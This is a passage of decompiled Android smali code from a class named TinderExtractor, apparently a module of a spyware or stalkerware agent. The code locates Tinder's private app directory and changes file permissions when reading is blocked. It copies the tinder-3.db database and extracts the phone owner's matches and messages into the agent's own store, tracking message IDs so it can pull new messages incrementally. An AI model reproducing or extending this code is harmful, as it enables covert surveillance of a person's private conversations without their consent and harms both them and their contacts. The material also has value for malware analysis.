    invoke-interface {p1, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    .line 342
    new-instance v5, Ljava/sql/Date;

    invoke-virtual {v4}, Ljava/lang/Long;->longValue()J

    move-result-wide v6

    invoke-direct {v5, v6, v7}, Ljava/sql/Date;-><init>(J)V

    iput-object v5, v3, Lcom/hp/vd/data/TinderMessageData;->createdAt:Ljava/util/Date;

    .line 348
    iget-object v4, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->tinderMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 350
    iget-object v3, v3, Lcom/hp/vd/data/TinderMessageData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->longValue()J

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    move-object v2, v3

    goto/16 :goto_0

    .line 353
    :cond_1
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v2, v0, :cond_2

    .line 360
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_message_id"

    .line 361
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 362
    invoke-virtual {v2}, Ljava/lang/Long;->intValue()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    .line 360
    invoke-virtual {p1, v1, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 365
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 366
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 381
    :cond_2
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Tinder Messages ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_0
    move-exception p1

    goto :goto_1

    :catch_1
    move-exception p1

    move-object v2, v0

    .line 369
    :goto_1
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "TinderExtractor"

    const-string v4, "Error extracting data."

    invoke-interface {v1, v3, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v2, v0, :cond_3

    .line 372
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_message_id"

    .line 373
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 374
    invoke-virtual {v0}, Ljava/lang/Long;->intValue()I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    .line 372
    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_3
    return-void
.end method

.method public getRootPath()Ljava/lang/String;
    .locals 1

    const-string v0, "/data/data/com.tinder"

    return-object v0
.end method

.method public getSharedPreferencesPath()Ljava/lang/String;
    .locals 2

    .line 486
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->getRootPath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/shared_prefs/sp.xml"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public isCompatible()Z
    .locals 4

    .line 491
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->getRootPath()Ljava/lang/String;

    move-result-object v0

    .line 492
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->getSharedPreferencesPath()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x2

    .line 494
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    const/4 v0, 0x1

    aput-object v1, v2, v0

    .line 500
    invoke-virtual {p0, v2}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->prepare([Ljava/lang/String;)V

    .line 502
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->extractCurrentlyConfiguredProfile(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    .line 504
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_0

    return v0

    .line 508
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Tinder profile was not detected."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v3
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 3

    .line 518
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 526
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    .line 521
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "isReadable(): exception caught"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 p1, 0x0

    return p1
.end method

.method public prepare([Ljava/lang/String;)V
    .locals 6

    const/4 v0, 0x0

    .line 458
    array-length v1, p1

    move v2, v0

    :goto_0
    if-ge v2, v1, :cond_2

    aget-object v3, p1, v2

    .line 460
    :try_start_0
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 462
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_0

    .line 463
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "TinderExtractor"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Path does not exist: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {p1, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 468
    :cond_0
    invoke-virtual {v4}, Ljava/io/File;->canRead()Z

    move-result v4

    if-nez v4, :cond_1

    .line 469
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {p0, v3, v4}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 472
    :catch_0
    iget-object p1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "TinderExtractor"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Exception caught while checking/chmodding path: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {p1, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_2
    return-void
.end method

.method public run()V
    .locals 8

    const-string v0, "TndTmpFile"

    .line 69
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    .line 75
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->getRootPath()Ljava/lang/String;

    move-result-object v0

    .line 76
    invoke-virtual {p0}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->getSharedPreferencesPath()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x2

    .line 78
    new-array v3, v2, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    const/4 v0, 0x1

    aput-object v1, v3, v0

    .line 84
    invoke-virtual {p0, v3}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->prepare([Ljava/lang/String;)V

    .line 86
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->extractCurrentlyConfiguredProfile(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_7

    .line 88
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    if-nez v3, :cond_0

    goto/16 :goto_2

    :cond_0
    const-string v3, "/data/data/com.tinder/databases"

    .line 100
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "/tinder-3.db"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 102
    new-array v2, v2, [Ljava/lang/String;

    aput-object v3, v2, v4

    aput-object v5, v2, v0

    .line 107
    array-length v0, v2

    move v3, v4

    :goto_0
    if-ge v3, v0, :cond_2

    aget-object v6, v2, v3

    .line 108
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_1

    .line 109
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {p0, v6, v7}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 117
    :cond_2
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 119
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v2

    const/4 v3, 0x3

    if-nez v2, :cond_3

    .line 120
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Database file is not a file at:"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 125
    :cond_3
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_4

    .line 126
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Database file does not exist."

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 131
    :cond_4
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v2, v4, v6

    if-nez v2, :cond_5

    .line 132
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Database file is 0L long."

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_5
    const/4 v2, 0x0

    :try_start_0
    const-string v3, "TndTmpFile"

    const-string v4, "db"

    .line 145
    iget-object v5, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->context:Lcom/hp/vd/context/Context;

    .line 148
    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v5

    .line 145
    invoke-static {v3, v4, v5}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v3
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 151
    :try_start_1
    invoke-virtual {p0, v0, v3}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 171
    :try_start_2
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    const/16 v4, 0x10

    invoke-static {v0, v2, v4}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0
    :try_end_2
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_2 .. :try_end_2} :catch_0

    .line 185
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->extractMatches(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    .line 186
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    .line 188
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 189
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    return-void

    :catch_0
    move-exception v0

    .line 174
    iget-object v1, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "TinderExtractor"

    const-string v4, "Exception caught while opening database."

    invoke-interface {v1, v2, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 176
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    return-void

    :catch_1
    move-exception v1

    move-object v2, v3

    goto :goto_1

    :catch_2
    move-exception v1

    :goto_1
    const-string v3, "unknown"

    if-eqz v2, :cond_6

    .line 156
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    .line 159
    :cond_6
    iget-object v2, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "TinderExtractor"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Exception copying the temp database from:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ", to: "

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v4, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    .line 89
    :cond_7
    :goto_2
    iget-object v0, p0, Lcom/hp/vd/module/custom/tinder/v1/TinderExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "TinderExtractor"

    const-string v2, "Tinder profile was not detected."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void
.end method

.method protected safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;
    .locals 2

    const-wide/16 v0, 0x0

    .line 386
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 387
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    .line 390
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    goto :goto_0

    .line 393
    :cond_0
    :try_start_0
    invoke-static {p1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide p1

    invoke-static {p1, p2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 395
    :catch_0
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    :goto_0
    return-object p1
.end method
